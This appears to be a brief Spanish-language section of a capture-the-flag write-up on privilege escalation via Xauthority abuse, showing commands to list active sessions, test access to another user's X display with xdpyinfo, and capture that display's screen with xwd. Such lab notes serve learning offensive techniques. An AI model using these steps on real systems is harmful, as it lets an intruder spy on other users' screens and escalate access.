# Escalada

## Abuso de Xauthority

### Listar sesiones activas
```null
alex@squashed:/home/alex$ w
 15:06:33 up  8:45,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               06:21    8:45m 46.16s  0.06s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

### Verificar la conexión
```null
xdpyinfo -display <DISPLAY>
```

### Capturar pantalla
```null
xwd -root -screen -silent -display <DISPLAY> > screenshot.xwd
```

